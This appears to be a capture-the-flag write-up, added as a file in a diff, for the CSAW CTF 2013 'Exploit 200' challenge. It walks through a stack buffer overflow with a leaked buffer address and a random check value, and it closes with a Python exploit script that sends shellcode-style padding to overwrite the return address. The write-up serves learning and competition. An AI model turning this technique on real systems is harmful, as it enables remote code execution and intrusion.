@@ -1,0 +1,63 @@
+CSAW CTF 2013 - Exploit 200
+================================
+
+Source were not provided, but with IDA and Hex-Ray we can get the following pseudocode:
+```
+int __cdecl handle(int fd)
+{
+  int result; // eax@1
+  unsigned int v2; // eax@1
+  char buf; // [sp+1Ch] [bp-80Ch]@1
+  char v4; // [sp+81Bh] [bp-Dh]@1
+  int v5; // [sp+81Ch] [bp-Ch]@1
+
+  v5 = 0;
+  memset(&buf, 0, 0x800u);
+  v2 = time(0);
+  srand(v2);
+  secret = rand();
+  v5 = secret;
+  *(_DWORD *)&buf = &buf;
+  send(fd, &buf, 4u, 0);
+  send(fd, &v5, 4u, 0);
+  send(
+    fd,
+    "Welcome to CSAW CTF.  Exploitation 2 will be a little harder this year.  Insert your exploit here:",
+    0x63u,
+    0);
+  recv(fd, &buf, 0x1000u, 0);
+  v4 = 0;
+  result = secret;
+  if ( v5 != secret )
+  {
+    close(fd);
+    exit(0);
+  }
+  return result;
+}
+```
+
+First thing to note is that `recv` read `0x1000` bytes of data into a buffer of `0x800`. We can use this to rewrite stack data. The overflow is big enough to rewrite the return address.
+
+By running `readelf -l exploit2` we get `GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4`, so the stack is executable (E flag in RWE).
+
+All we need to do is to send our favorite shellcode and rewrite the return adresse to jump on our shellcode at the buffer location. The buffer location is sent by the application (`send(fd, &buf, 4u, 0);`).
+
+The last thing to note is the `secret` variable. It is use to hold a random number and its value is copied into `v5`. If the value of `v5` changed after we send our payload, the program exit. Therefor, we need to keep the same value when we rewrite the stack since `v5` is before the buffer. Luckily, the secret value is sent before `recv`, so we can write it in our payload.
+
+Our final exploit code was the following:
+
+```
+shellcode = ''
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('128.238.66.212', 31338))
+
+buf_size = 0x800
+buf_addr = s.recv(4)
+secret = s.recv(4)
+s.recv(1024)
+
+payload = shellcode + '\x90' * (buf_size-len(shellcode)) + secret + '\x90' * 12 + buf_addr
+
+s.send(payload)
+```
